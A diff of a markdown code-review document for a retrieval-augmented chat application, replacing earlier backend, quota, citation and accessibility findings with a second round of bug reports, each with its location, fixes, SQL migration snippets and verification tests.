-    1. The system prompt never tells the model how to cite. Inline pills appear only if the model happens to write `[file.md (Lines X-Y)]`.
-    2. The retriever builds citations for 5 chunks, but the synthesizer sends only the top 3 to the model. The "Grounding Citations" tray lists sources the model never saw.
-    3. `renderCitations` turns any `[name.md]` into a pill, even when the filename is not in `citations`. A hallucinated source is then rendered as a verified citation ("Retrieved from a knowledge base chunk").
-    4. `citationMap` is keyed by filename, so several chunks from one file collapse to the last one, and the pill shows the wrong preview and lines.
-    5. The sidebar highlights a document by filename _substring_ (`"a.md"` matches `"data.md"`) instead of by `documentId`.
-- **Fix:**
-    1. Give each context block a short stable label, e.g. `[S1]`…`[S3]`, in the wrapper attribute (`wrap_untrusted_context(..., label="S1")`). Add to the system prompt: "Cite sources inline as [S1], [S2] … using only the labels provided. Never invent labels." Send `citations` as `{label, chunkId, documentId, filename, startLine, endLine, headerPath, preview}` and include **only the chunks passed to the model**.
-    2. In `MarkdownRenderer`, match `/\[S(\d+)\]/g` against a map from label to citation. Render unknown labels as plain text. Remove the filename regex and `CITABLE_EXTENSION`.
-    3. Pass `documentId` through `onCitationClick` and compare `doc.id === selectedCitationDocId` in the sidebar.
-- **Verify:** Frontend test: content `"See [S2] and [S9]"` with one citation labelled S2 renders exactly one pill. Backend test: `len(done.citations) == number of chunks in the prompt`.
+- **Where:** `scripts/seed_kb.py` (`DELETE FROM document_chunks ...` then insert with `chunk.id = uuid4()`), `app/rag/parser.py` (random ids).
+- **Problem:** Document ids are stable (`uuid5`) but chunk ids are random. Every re-seed invalidates `chunkId` inside saved `messages.reflection_summary.citations`, so old conversations show "This passage is no longer available." Also, if every seeded file produced zero chunks, `DELETE ... id <> ALL('{}')` deletes all seeded documents.
+- **Fix:** `parse_markdown(..., chunk_id_namespace: UUID | None = None)`: when given, set `id=uuid5(chunk_id_namespace, str(chunk_index))`. `seed_kb.py` passes the document's uuid5. Replace delete-then-insert with `INSERT ... ON CONFLICT (id) DO UPDATE SET content = EXCLUDED.content, embedding = EXCLUDED.embedding, embedding_model = EXCLUDED.embedding_model, metadata = EXCLUDED.metadata` and delete only chunks of that document whose `chunk_index >= len(chunks)`. Abort with an error if `doc_models` is empty before the `DELETE`.
+- **Verify:** Run the seed logic twice against a test DB (`db` test or by unit-testing the id generation): chunk ids are identical across runs.
 
-### LOG-06 · Medium · "Critic" is a constant heuristic shown as reflection
+### R2-LOG-06 · Medium · Conversation switch race
 
-- **Where:** `apps/backend/app/agent/graph.py:307-339`; `apps/backend/app/agent/state.py:63-69`; `apps/frontend/components/observability-panel.tsx:71,153-168`; `apps/frontend/hooks/useAgentStream.ts:188`.
-- **Problem:**
-    - `score` can only be 0.35, 0.80 or 0.95. Because `citations == chunks`, `citation_bonus` is always applied whenever chunks exist.
-    - The UI shows "Critic Soundness: 95% (Grounded)" or "(Re-planning)". The log line says "REPLAN", and a tile is labelled "Critic loops". No re-planning or loop exists (`needs_replan` is always `False`; the graph is a straight line).
-    - `TODOs.md:63` marks "reflection critic node with loop-back condition (capped at 10 iterations)" as done.
-    - All of this conflicts with the Honesty Rule.
-- **Fix (KISS):**
-    1. Rename the node's output to what it is: `grounding = "grounded" | "weak" | "none"` based on `chunks_count` and the best `dense_score` (`>= 0.5`). Drop `reflection_score`, `needs_replan`, `iteration_count`, `max_iterations` and `_run_config`.
-    2. UI: replace the percentage badge with "Grounded in N sources" or "No supporting sources found". Remove the "Critic loops" tile and the "REPLAN"/"Re-planning" strings.
-    3. Update the contracts (`AgentInvokeResponse`) and the SSE `critic` payload to match.
-    4. If a real critic is wanted later, implement it as an LLM call with a defined rubric. Until then, do not label this as reflection.
-- **Verify:** `grep -ri "replan\|re-planning\|critic loops" apps/` returns nothing.
+- **Where:** `apps/frontend/hooks/useChatHistory.ts::handleSelectConversationItem`.
+- **Problem:** Click conversation A then B quickly. A's slower fetch resolves last and calls `handleSelectConversation(A, ...)`, replacing B's messages while B is highlighted.
+- **Fix:** Keep a `selectionRef = useRef<string | null>(null)`. Set `selectionRef.current = conv.id` at the start of the handler. In the `.then` of the fetch, `if (selectionRef.current !== conv.id) return;`. Also reset `selectionRef.current = null` in `handleNewChat`.
+- **Verify:** Hook/component test with two deferred promises resolved out of order; the last click wins.
 
-### LOG-07 · Medium · Chunk line numbers are wrong
+### R2-LOG-07 · Medium · Persistence failure is invisible to the user
 
-- **Where:** `apps/backend/app/rag/parser.py:18-35,114,149,173`.
-- **Problem:** `compute_line_positions` finds the _first occurrence_ of the chunk's first line anywhere in the document. Repeated lines (`---`, ` ``` `, table headers, overlap chunks) map to an earlier location. Line numbers are also computed on the _scrubbed_ text: secret redaction collapses multi-line private keys, so every later line number shifts away from the original file.
-- **Fix:**
-    1. Track a running character cursor: for each sub-chunk, search with `full_text.find(sub_text_first_line, cursor)` and advance the cursor to the match position. Overlapping chunks restart from the previous chunk's start.
-    2. Do the redaction per chunk _after_ positions are computed on the original text (scrub `sub_text`, not the whole document). Alternatively, replace a redacted block with the same number of newlines.
-- **Verify:** Test: a document where `---` appears on lines 3 and 40; the chunk starting at line 40 reports `startLine == 40`.
+- **Where:** `apps/backend/app/routes/agent.py::persist_turn` (returns `None` on failure), `done.conversationId`; `apps/frontend/app/page.tsx::streamInto`.
+- **Problem:** For a signed-in Google user a failed save yields `conversationId: null`. The frontend ignores the field, inserts the conversation into the sidebar anyway (optimistically, using `sessionId`), and caches the transcript locally. After a reload the chat is gone with no explanation.
+- **Fix:** In `streamInto`, for Google users, if `result.conversationId` is falsy: do **not** add the item to `conversations`, and call `setChatNotice("This answer could not be saved to your history.")` (expose `setChatNotice` from `useChatHistory`, it already returns it). Keep the answer visible.
+- **Verify:** `page.test.tsx`: a `done` payload with `conversationId: null` shows the notice and does not add a sidebar item.
 
-### LOG-08 · Medium · Lexical search rarely matches; sequential; no degraded mode
+### R2-LOG-08 · Low · Quota read path duplicates and races the SQL replenish logic
 
-- **Where:** `apps/backend/app/db/neon.py:483,504`; `apps/backend/app/rag/hybrid_search.py:177-194`.
-- **Problem:**
-    - `plainto_tsquery` ANDs every non-stop-word, so "Which models have the lowest input token cost per 1M on OpenRouter?" needs all terms in one 800-character chunk. The sparse side of RRF then contributes almost nothing.
-    - Dense and sparse queries run sequentially, though the docstring says "parallel".
-    - If the embedding call fails, the whole search raises, even though lexical search could still answer.
-- **Fix:**
-    1. Use `websearch_to_tsquery('english', $1)`, or build an OR query: `to_tsquery('english', string_agg(lexeme, ' | '))` from `ts_debug` / `tsvector_to_array(to_tsvector('english', $1))`. The OR form gives the best recall for RRF.
-    2. Run the embedding call and the lexical query concurrently with `asyncio.gather` (dense must wait for the embedding, so gather `embed+dense` with `sparse`).
-    3. If the embedding fails, log a warning and return sparse-only RRF results. Add `degraded: true` to the result so the UI can say so.
-- **Verify:** db test: the sample query above returns at least one sparse hit from `openrouter_metrics.md`. Unit test: embedding raises → results come back with `dense_rank is None`.
+- **Where:** `apps/backend/app/db/neon.py::get_or_create_rate_limit`, `consume_rate_limit`.
+- **Problem:** The "replenish after one hour" rule exists twice (SQL in `consume_rate_limit`, Python plus a second `UPDATE` in `get_or_create_rate_limit`). The read path is a read-modify-write and can overwrite a concurrent consume.
+- **Fix:** Make the read path side-effect free: `INSERT ... ON CONFLICT (user_id) DO NOTHING` to guarantee a row, then `SELECT user_id, bucket_capacity, last_replenished_at, CASE WHEN last_replenished_at <= NOW() - INTERVAL '1 hour' THEN bucket_capacity ELSE tokens_remaining END AS tokens_remaining FROM rate_limit_buckets WHERE user_id = $1`. Return `resets_at` computed from the same row. No `UPDATE` in the read path.
+- **Verify:** Existing quota tests pass; add a `db` test that reading an expired bucket reports full capacity without changing `last_replenished_at`.
 
-### LOG-09 · Medium · Quota consumed before validation; not refunded on cancel
+### R2-LOG-09 · Low · `last_seen_at` is written on every request
 
-- **Where:** `apps/backend/app/routes/agent.py:284-306`; `apps/backend/app/routes/documents.py:118-179`; `apps/frontend/app/page.tsx:198`.
-- **Problem:**
-    - Agent: an invalid or inaccessible `documentId` returns 400/404 _after_ a token was consumed.
-    - Upload: 415, 409, 413, empty-file and 503 responses, and the dedup early return, all happen after consumption.
-    - Client Stop or disconnect raises `CancelledError` (a `BaseException`), which skips the `except Exception` refund path.
-    - The frontend decrements quota locally after every upload, even for a dedup, instead of using the server's count.
-- **Fix:**
-    1. Reorder both routes: parse, validate, check access and dedup first, then `check_and_consume` as the last step before the paid work.
-    2. In `run_pipeline`, add `except asyncio.CancelledError:` → refund only if the synthesizer had not started its LLM call (track a `llm_started` flag), then re-raise.
-    3. Return `quotaRemaining` in the upload response and use it in `page.tsx` instead of `quotaRemaining - 1`.
-- **Verify:** Tests: an inaccessible `documentId` → 404 and quota unchanged; a duplicate upload → quota unchanged.
+- **Where:** `app/core/auth.py::get_current_user` (always `update_user_last_seen`), `app/routes/auth.py::get_current_user_profile` (a second update).
+- **Problem:** Every authenticated request issues an `UPDATE users`, and `/api/auth/me` issues two. That is write amplification on a serverless database for a value only used by a 24 h pruning rule.
+- **Fix:** Add `NeonDatabase.touch_user(user_id)`: `UPDATE users SET last_seen_at = NOW() WHERE id = $1 AND last_seen_at < NOW() - INTERVAL '5 minutes'`. Use it in `get_current_user`. In `/auth/me` keep only one call that also stores the IP (`update_user_last_seen(user.id, client_ip)`), and remove the other.
+- **Verify:** Test that two calls within 5 minutes produce one write (spy on the connection).
 
-### LOG-10 · Medium · stdio MCP server never connects to the DB
+### R2-LOG-10 · Low · `/api/rag/search` charges quota before validating input
 
-- **Where:** `apps/backend/app/mcp/server.py:28-79`.
-- **Problem:**
-    - `main()` never calls `neon_db.connect()`, so `hybrid_rag_search` always returns "Knowledge base unavailable" over stdio. This is the transport that Claude Desktop and Cursor use.
-    - `handle_jsonrpc_request` calls `req_dict.get` on whatever was parsed, so a JSON array (batch) or scalar raises `AttributeError` and kills the read loop.
-    - Notifications are checked twice (`:40` and `:70`).
-- **Fix:**
-    1. In `main()`: `await neon_db.connect()` before the loop and `await neon_db.disconnect()` in a `finally`.
-    2. If `not isinstance(req_data, dict)`, respond `INVALID_REQUEST` with `id=None` and continue.
-    3. Keep one notification check.
-- **Verify:** Test: `handle_jsonrpc_request([1,2])` returns an INVALID_REQUEST error dict without raising.
+- **Where:** `apps/backend/app/routes/rag.py::hybrid_search_documents`.
+- **Problem:** `check_and_consume` runs before the `documentId` UUID parse and the `require_document_access` call, so a malformed or foreign `documentId` costs a token. The agent route does it in the right order.
+- **Fix:** Move the `documentId` parsing and the access check above `check_and_consume`. Also use `documentId: UUID | None` in `HybridSearchRequestWire` so FastAPI returns `422` and the manual `try/except ValueError` can be deleted.
+- **Verify:** Test: bad `documentId` returns `422` and the quota is unchanged.
 
-### LOG-11 · Low · History window magic numbers; guests lose context silently
+### R2-LOG-11 · Low · `/api/auth/refresh` is never called; sessions die silently after 24 h
 
-- **Where:** `apps/backend/app/routes/agent.py:310-318` (`[-2 * 6:]`); `apps/backend/app/agent/state.py:50`; `apps/backend/app/agent/graph.py:433`.
-- **Problem:**
-    - The route fetches _all_ messages, keeps the last 12, and the synthesizer then keeps the last 6, so only 3 turns survive. Both numbers are hard-coded in two places.
-    - Guests always start fresh (`sessionId` is ignored for guests), but the UI looks like a continuous chat and follow-up questions quietly lose context.
-- **Fix:**
-    1. Add `settings.CHAT_HISTORY_MESSAGES = 6`. Fetch with `LIMIT` in SQL (newest N, then reverse) and remove `max_history_turns` from the state.
-    2. Either keep the last N turns for guests in memory, keyed by guest `session_id` with a TTL (simple dict, max 1,000 sessions), or show an inline note in the UI for guests: "Guest chats don't remember earlier questions. Sign in with Google to keep context."
-- **Verify:** Test: the conversation history query uses `LIMIT`; a guest follow-up either receives history or the UI note renders.
+- **Where:** `apps/backend/app/routes/auth.py::refresh_token`, `refresh_limiter`, `MAX_SESSION_AGE_DAYS`, `REFRESH_PER_IP_PER_HOUR`; frontend (`grep -rn "auth/refresh" apps/frontend` finds nothing).
+- **Problem:** Access tokens last 24 h and the refresh endpoint exists, but the frontend never uses it. After a day the user is signed out (see R2-UX-02). The whole refresh stack (endpoint, limiter, two settings, the `auth_time` claim and its cap) is dead weight. See **DECISION D2**.
+- **Fix (recommended, if D2 = "wire it"):** In `auth-store.ts::initAuth`, after `/api/auth/me` succeeds, decode the token's `exp` (base64url middle segment, `JSON.parse`) and, if less than 12 hours remain, `POST /api/auth/refresh` and `applySession` with the result. Also refresh in the background every 6 hours while the tab is open. On failure do nothing (the 401 path handles it).
+  Backend: in `refresh_token` call `enforce_ip_limit` **before** any database work (today it queries the quota first), and delete the second `decode_access_token` (read `auth_time` from the claims already decoded by the dependency by exposing them on the request, or decode once).
+- **Fix (if D2 = "delete it"):** Delete `refresh_token`, `refresh_limiter`, `REFRESH_PER_IP_PER_HOUR`, `MAX_SESSION_AGE_DAYS`, the `auth_time` claim and their tests.
+- **Verify:** Frontend test: a token with 2 hours left triggers exactly one refresh call on init and replaces the stored token.
 
-### LOG-12 · Low · Scope classifier easy to bypass; computed 3 times
+### R2-LOG-12 · Low · MCP: unknown or malformed tool names are charged, mis-audited, or 500
 
-- **Where:** `apps/backend/app/agent/graph.py:54-162,185,399,491`; `apps/backend/app/routes/agent.py:284`.
-- **Problem:**
-    - The keyword list includes generic words ("model", "token", "pipeline", "queue", "eval", "metrics", "diagram"), so "write a poem about a model" counts as architectural and costs a live LLM call. The guardrail is a cost gate, not a scope boundary.
-    - `classify_query_intent` runs in the route, the planner, the router and the synthesizer (DRY).
-- **Fix:**
-    1. Classify once in the planner and store `state.intent`. `route_after_planner` and the synthesizer read `state.intent`. The route keeps its own call only to decide quota, or better, always consumes quota except for refusals detected by the planner (then refund).
-    2. Remove the most generic single words ("model", "token", "pipeline", "queue", "eval", "metrics", "diagram", "vector", "partition") or require two keyword hits for single generic words.
-- **Verify:** Update `test_guardrails_domain.py` with "write a poem about a model" → `out_of_scope`.
+- **Where:** `apps/backend/app/mcp/dispatch.py` (`tools/call`), `app/mcp/registry.py::call_tool`, `app/core/audit_log.py`.
+- **Problem:** (a) `validate_arguments` returns `None` for an unknown tool, so the quota is consumed and an audit row is written for a call that did nothing. (b) `params["name"]` may be a non-string (for example an object), which makes `ARGUMENT_MODELS.get(name)` raise `TypeError: unhashable`, producing a generic `Internal error`. (c) `tool_audit_logs.tool_name` is `VARCHAR(100)`; a longer name makes the insert fail and the error is swallowed after two retries. (d) `validate_arguments` runs twice (dispatch and `call_tool`).
+- **Fix:** In `tools/call`: require `isinstance(tool_name, str) and 0 < len(tool_name) <= 100`, else `INVALID_PARAMS`. Check `tool_name in ARGUMENT_MODELS` and return `INVALID_PARAMS "Unknown tool"` **before** `check_and_consume`. Validate once: have `dispatch` call `validate_arguments` and pass the parsed model into `call_tool(parsed, ...)`.
+- **Verify:** Tests: unknown tool and non-string name return `-32602` and do not change the quota; a 500-character name returns `-32602`.
 
-### LOG-13 · Medium · No document deletion
+### R2-LOG-13 · Low · `/api/health` runs three DB queries per unauthenticated call
 
-- **Where:** `apps/backend/app/routes/documents.py:132-137`; `apps/frontend/components/workspace-sidebar.tsx:159-192`.
-- **Problem:** After 20 uploads the API returns 409 "Delete a document first", but no delete endpoint or UI exists. The privacy policy also promises users can remove stored documents.
-- **Fix:**
-    1. Add `DELETE /api/documents/{id}`: 404 unless `doc.user_id == current_user.id and not doc.is_seeded`; `DELETE FROM documents WHERE id=$1 AND user_id=$2` (chunks cascade). Write an audit entry.
-    2. Add a trash button for non-seeded documents in the sidebar, using the same two-step confirm pattern as `SidebarChatHistory`.
-- **Verify:** Tests: owner delete → 200 and chunks gone; deleting someone else's doc → 404; deleting a seeded doc → 404.
+- **Where:** `apps/backend/app/routes/health.py`.
+- **Problem:** Each call checks out a connection and runs `SELECT 1`, `SHOW server_version` and a `pg_extension` scan, even in production where the extra data is discarded. Anyone can use it to exhaust the 10-connection pool.
+- **Fix:** Run `SELECT 1` always. Run the version and extension queries only `if settings.is_dev`. Use `asyncio.wait_for(..., timeout=2)` around the acquire so a saturated pool reports `unhealthy` instead of hanging.
+- **Verify:** Test that in production mode only one query runs (fake pool counting `fetchval` calls).
 
-### LOG-14 · Medium · Starter prompts ask about models not in the knowledge base
+### R2-LOG-14 · Medium · Missing indexes and constraints; dead `hitl_approved` column
 
-- **Where:** `apps/frontend/components/chat-canvas.tsx:126-131`; `apps/frontend/components/mcp/McpInspector.tsx:22`.
-- **Problem:** The suggested prompts ask about "Claude Sonnet 3.7 vs GPT-4o" and "Gemini 2.5 Flash". `grep -i "sonnet 3.7\|gpt-4o\|gemini 2.5 flash" knowledge_base/` returns nothing. The first thing a demo user clicks produces an ungrounded answer. ("Sonnet 3.7" is also not the model's real name; it is "Claude 3.7 Sonnet".)
-- **Fix:** Replace the four prompts and the MCP default query with questions answerable from the four KB files, using model names that appear in them (e.g. "Compare Claude Opus 5 and its peers on SWE-Bench Verified in CursorBench"). Add a frontend test that pins the list so changes are deliberate.
-- **Verify:** For each prompt, run `/api/rag/search` (db test) and assert at least one result whose `filename` matches the intended file.
+- **Where:** `migrations/20260901000000_core_schema.sql`; `app/core/audit_log.py`.
+- **Problem:** (a) No index on `documents(user_id)`; the document list, count, and dedup queries scan the table. (b) `agent_conversations.user_id` and `rate_limit_buckets.user_id` are nullable, so orphan rows are possible and invisible. (c) No `CHECK (tokens_remaining >= 0)`. (d) `tool_audit_logs.hitl_approved` is always `TRUE` since HITL was removed (dead column and parameter). The trigger function compares it, so it cannot simply be dropped.
+- **Fix:** New migration `20261103000100_constraints_and_cleanup.sql` (separate from R2-SEC-07's file):
 
-### LOG-15 · Low · `seed_kb.py` rotates IDs; hash differs from upload
+    ```sql
+    CREATE INDEX IF NOT EXISTS idx_documents_user ON documents(user_id);
+    DELETE FROM agent_conversations WHERE user_id IS NULL;
+    ALTER TABLE agent_conversations ALTER COLUMN user_id SET NOT NULL;
+    DELETE FROM rate_limit_buckets WHERE user_id IS NULL;
+    ALTER TABLE rate_limit_buckets ALTER COLUMN user_id SET NOT NULL;
+    ALTER TABLE rate_limit_buckets ADD CONSTRAINT rate_limit_tokens_nonneg CHECK (tokens_remaining >= 0);
+    -- Rewrite the trigger function WITHOUT hitl_approved first, then drop the column.
+    CREATE OR REPLACE FUNCTION tool_audit_logs_guard() RETURNS trigger AS $$ ... $$ LANGUAGE plpgsql;
+    ALTER TABLE tool_audit_logs DROP COLUMN IF EXISTS hitl_approved;
+    ```
 
-- **Where:** `scripts/seed_kb.py:62-64,116`.
-- **Problem:** Each run deletes all seeded documents and inserts new UUIDs, which invalidates every stored citation `documentId`. The seed hashes decoded text while upload hashes raw bytes (`documents.py:163`), so identical files get different hashes.
-- **Fix:** Derive a stable ID with `uuid5(NAMESPACE_URL, f"kb:{doc_path.name}")`. Upsert documents (`ON CONFLICT (id) DO UPDATE`) and replace that document's chunks. Hash `doc_path.read_bytes()`.
-- **Verify:** Run twice; document IDs are unchanged.
+    (Copy the existing function body and remove `NEW.hitl_approved`/`OLD.hitl_approved` from both tuples.) Then remove `hitl_approved` from `audit_log.py` (`INSERT_QUERY`, `SELECT_COLUMNS`, `_row_to_entry`, the parameter) and from every test and caller.
 
-### LOG-16 · Low · Account switch within 8 s skips the conversation fetch
-
-- **Where:** `apps/frontend/hooks/useChatHistory.ts:41-42,91-127`.
-- **Problem:** `lastFetchConversationsRef` is not reset when `user.id` changes. User B signing in within 8 s of user A's fetch gets no list.
-- **Fix:** In the existing `[user?.id]` effect, also reset `lastFetchConversationsRef.current = 0` and `setConversations([])`.
-- **Verify:** Hook test: switch users and assert that `apiClient` was called for the second user.
-
-### LOG-17 · Low · Fabricated audit timing; missing conversation link
-
-- **Where:** `apps/backend/app/agent/graph.py:291-298` (`duration_ms=0`); `apps/backend/app/routes/documents.py:209-216` (`duration_ms=0`).
-- **Problem:** Audit rows claim 0 ms, which is false telemetry. `conversation_id` is never set, so audit rows cannot be joined to chats.
-- **Fix:** Time the search or upload with `time.perf_counter()`. Pass `conversation_id` when the session is a persisted conversation (Google users).
-- **Verify:** Test: the audit entry has `duration_ms > 0` when the search is mocked with a 5 ms sleep.
-
-### LOG-18 · Low · Message saves are not transactional
-
-- **Where:** `apps/backend/app/db/neon.py:630-661`; `apps/backend/app/routes/agent.py:227-238`.
-- **Problem:** The insert and the `updated_at` update are separate statements. The user message and the assistant message are saved in separate calls, so a failure can leave a question with no answer.
-- **Fix:** Add `save_turn(conversation_id, user_content, assistant_content, plan_trace, reflection)` that runs both inserts and the `updated_at` update inside `async with conn.transaction():`. Delete `save_message`.
-- **Verify:** db test: force the second insert to fail (e.g. invalid role); no rows remain.
-
-### LOG-19 · Medium · DB outage → unhandled 500 everywhere
-
-- **Where:** `apps/backend/app/db/neon.py:21-25` (`RuntimeError`); `apps/backend/app/core/auth.py:121`; `apps/backend/app/main.py:26-36`.
-- **Problem:** If `connect()` fails at startup, the app still boots. Every authenticated request then raises `RuntimeError` from `get_pool()`, which becomes a 500 with a stack trace in the logs. Because auth needs the DB, the in-memory fallbacks in the rate limiter and audit logger can never be reached by an authenticated request (see CLN-02).
-- **Fix:**
-    1. Define `class DatabaseUnavailable(RuntimeError)` and raise it from `get_pool()`.
-    2. Register `@app.exception_handler(DatabaseUnavailable)` returning 503 `{"detail": "Service temporarily unavailable"}` with `Retry-After: 30`.
-    3. In production, fail fast at startup: if `ENVIRONMENT == "production"` and `connect()` returns `False`, raise.
-- **Verify:** Test with `neon_db.pool = None` and a valid token: `/api/auth/me` → 503.
+- **Verify:** `tests/test_migrations.py` still passes on a fresh database; the audit append-only tests still pass; the trigger still rejects `UPDATE`/`DELETE`.
 
 ---
 
-## 4. UI/UX and accessibility findings
+## 4. UI/UX findings
 
-### UX-01 · High · Text is too small to read comfortably
+### R2-UX-01 · Medium · Composer has no length limit or counter
 
-- **Where:** `MarkdownRenderer.tsx` (every block is `text-xs`, code `text-[11px]`), `chat-canvas.tsx`, `workspace-sidebar.tsx`, `observability-panel.tsx`, `SidebarChatHistory.tsx`, `McpInspector.tsx` (many `text-[10px]`/`text-[11px]`); spec `target/DESIGN.md:72-77` (`body-md: 14px`).
-- **Problem:** Long technical answers render at 12px with 12px tables and 11px code. Sidebars use 10–11px. The design spec says 14px body and claims WCAG AAA.
-- **Fix:**
-    1. Answer body: `text-sm` (14px) with `leading-relaxed`; headings h2 `text-base`, h3 `text-sm`; code and tables `text-[13px]` (the spec's code size).
-    2. User message bubble: `text-sm`.
-    3. Raise every `text-[10px]` to at least `text-xs` (12px). Keep 11px only for timestamps and badges.
-    4. Add `--text-body: 0.875rem` etc. to `@theme` in `globals.css` and use the tokens, instead of arbitrary values (this also satisfies AGENTs.md anti-pattern #2).
-- **Verify:** `grep -rn "text-\[10px\]" apps/frontend/components apps/frontend/app` returns 0. Visual check at 1280px and 375px widths.
+- **Where:** `apps/frontend/components/composer.tsx`, `lib/limits.ts`; backend `AgentStreamRequestWire.query` (`max_length=2000`).
+- **Problem:** A user who pastes 3000 characters sees the raw server message "String should have at most 2000 characters" after sending.
+- **Fix:** Add `export const MAX_QUERY_CHARS = 2000;` to `lib/limits.ts` (with the "keep in sync" comment like the upload limit). Put `maxLength={MAX_QUERY_CHARS}` on the textarea. Show `"{n}/2000"` (class `text-xs text-muted-foreground`, `text-destructive` at 100 %) only when `prompt.length > 1600`. Add `aria-describedby` pointing to the counter.
+- **Verify:** Composer test: typing past the limit is blocked, and the counter appears at 1601 characters.
 
-### UX-02 · Medium · Contrast below the stated targets
+### R2-UX-02 · Medium · Expired session logs the user out with no explanation
 
-- **Where:** `apps/frontend/styles/globals.css`.
-- **Problem (measured):**
+- **Where:** `apps/frontend/lib/auth-store.ts` (`clearSession` via `setOnUnauthorizedCallback`), `initAuth` catch.
+- **Problem:** On a `401` (token expired after 24 h or revoked) the store silently resets and the header flips to "Sign In". The user does not know why their chats vanished.
+- **Fix:** Add `sessionNotice: string | null` to the store. Set it in the unauthorized callback to `"Your session expired. Please sign in again."` (not on manual logout). Render it in `ChatCanvas` as a `role="status"` banner with a "Sign in" button, and clear it on the next successful login.
+- **Verify:** Test: a `401` from any `apiClient` call sets the notice; logout does not.
 
-    | Pair                                                  | Ratio      | Status                       |
-    | ----------------------------------------------------- | ---------- | ---------------------------- |
-    | Dark mode button: white on `--primary #3b82f6`        | **3.68:1** | Fails AA (needs 4.5)         |
-    | `--warning #b45309` on `--warning-bg #fffbeb`         | 4.84:1     | Passes AA, fails claimed AAA |
-    | `--success #15803d` on `--success-bg #ecfdf5`         | 4.76:1     | Passes AA, fails claimed AAA |
-    | `--destructive #dc2626` on white                      | 4.83:1     | Passes AA, fails claimed AAA |
-    | `--muted-foreground #475569` on `--secondary #f1f5f9` | 6.92:1     | Fails claimed AAA            |
-    | Dark citation `#60a5fa` on `#1e293b`                  | 5.75:1     | Passes AA                    |
+### R2-UX-03 · Medium · Mobile layout problems
 
-- **Fix:**
-    1. Dark `--primary`: use `#2563eb` (white text about 5.2:1), and keep `#3b82f6` only for non-text accents.
-    2. Decide on a target. **AA is the realistic one**; change `DESIGN.md §6` to "WCAG 2.2 AA" unless you darken `--warning` to `#92400e`, `--success` to `#166534` and `--destructive` to `#b91c1c` for 7:1.
-- **Verify:** Re-run the contrast script on every foreground/background token pair; all text pairs are ≥ 4.5:1 (or ≥ 7:1 if AAA is kept).
+- **Where:** `apps/frontend/components/app-header.tsx` (quota badge `hidden sm:flex`; `width: ${quotaRemaining / bucketCapacity}`), `app/page.tsx` (`h-screen`), `styles/globals.css` (`min-height: 100vh`), `app/layout.tsx` (`min-h-screen`).
+- **Problem:** (a) Phones never see the remaining quota except inside the profile popover. (b) `100vh` includes the collapsing browser toolbar on mobile Safari/Chrome, so the composer is pushed under the browser UI. (c) While `bucketCapacity` is `0` (before `/auth/me` answers) the width is `NaN%`.
+- **Fix:** (a) Show a compact `"{remaining}/{capacity}"` pill below `sm` (same data, smaller). (b) Use `h-dvh` / `min-h-dvh` and `min-height: 100dvh`. (c) `const pct = bucketCapacity > 0 ? Math.min(100, Math.max(0, (quotaRemaining / bucketCapacity) * 100)) : 0;`.
+- **Verify:** Test the header with `bucketCapacity = 0` (no `NaN` in style). Manual check at 375 px width.
 
-### UX-03 · Low · Skip link never rendered
+### R2-UX-04 · Low · Signing in from a guest session abandons guest uploads
 
-- **Where:** `apps/frontend/styles/globals.css:198-213`; `DESIGN.md:225-226`.
-- **Problem:** `.skip-link` is styled, but no element uses it, and there is no `#main-canvas` target.
-- **Fix:** Add `<a href="#main-canvas" className="skip-link">Skip to chat</a>` as the first child of `<body>` in `layout.tsx`, and `id="main-canvas"` on the `<main>` in `chat-canvas.tsx`.
-- **Verify:** Tab once from page load; the skip link is visible and moves focus to the chat.
+- **Where:** `app/db/neon.py::upsert_google_user` creates a new user id; guest data stays on the guest row, which the prune job deletes after 24 h.
+- **Problem:** A guest uploads a document, then signs in with Google: the document list shows nothing, with no warning.
+- **Fix:** Cheapest option (KISS): in `SignInDialog`, when the current user is a guest and has uploaded documents, show: "Signing in starts a fresh workspace. Documents uploaded as a guest will be deleted." (pass `hasGuestDocuments` from `page.tsx`, derived from `docs.some(d => !d.isSeeded)`). Do not build migration of guest data (YAGNI).
+- **Verify:** Dialog test with and without guest documents.
 
-### UX-04 · Medium · Quota exhaustion opens a sales modal
+### R2-UX-05 · Low · Accessibility noise
 
-- **Where:** `apps/frontend/app/page.tsx:396-399,411-414`; `apps/frontend/components/chat-canvas.tsx:86-107`; `apps/frontend/components/app-header.tsx:94-106` (`hidden sm:flex`).
-- **Problem:** When quota hits 0, pressing Send opens "Hire Me" instead of saying when queries come back. The server knows `last_replenished_at` but does not expose it. On mobile the quota badge is hidden, so the user cannot see they are out until the modal appears.
-- **Fix:**
-    1. Backend: add `resetsAt` (ISO) to `QuotaStatus` and to the 429 body (`last_replenished_at + 1h`).
-    2. Frontend: on Send with 0 quota, show an inline notice above the composer, "You've used all 5 queries. More at 14:32.", and disable Send. Keep a secondary "Need more?" link to the Hire Me modal.
-    3. Show the quota badge on mobile, compact (`3/5`).
-- **Verify:** Page test: quota 0 → notice with a time is visible; the modal does not open automatically.
+- **Where:** `components/chat-canvas.tsx` (`<main role="main">`), `workspace-sidebar.tsx` and `observability-panel.tsx` (`<aside role="complementary">`), `app-header.tsx` (`<header role='banner'>`), `components/ui/dialog.tsx` (`role="dialog" aria-modal="true"` duplicates Radix), `styles/globals.css` (`:focus-visible { outline ... !important }`).
+- **Problem:** Redundant ARIA roles add lint noise and no value. The global `!important` outline overrides every component-level focus style (`focus-visible:ring-*`), so two focus systems fight and cannot be tuned.
+- **Fix:** Remove the redundant `role` attributes. In `dialog.tsx` drop `role` and `aria-modal` (Radix sets them). In `globals.css` remove `!important` and keep the rule as the default (components can then override with Tailwind classes).
+- **Verify:** Existing a11y/role tests are updated to query by element (`getByRole('main')` still works because `<main>` has the implicit role).
 
-### UX-05 · Medium · Citations cannot be opened
+### R2-UX-06 · Low · Internal jargon and a wrong protocol label in end-user UI
 
-- **Where:** `apps/frontend/app/page.tsx:260-266`; `apps/frontend/components/canvas/CitationPill.tsx:38-43,88`; unused endpoint `GET /api/documents/{id}/chunks` (`documents.py:81-101`).
-- **Problem:** Clicking a citation only highlights a filename in a collapsed list. On mobile it switches the tab away from the answer. Users cannot read the source passage. The design spec promises "jump to exact line ranges".
-- **Fix:** On click, open a side `Dialog` (existing primitive) that fetches `/api/documents/{documentId}/chunks`, shows the cited chunk (scrolled into view, highlighted) with its header path and line range, and keeps the answer in place. Remove the mobile tab switch.
-- **Verify:** Page test: click a pill → the dialog shows the preview text of that chunk.
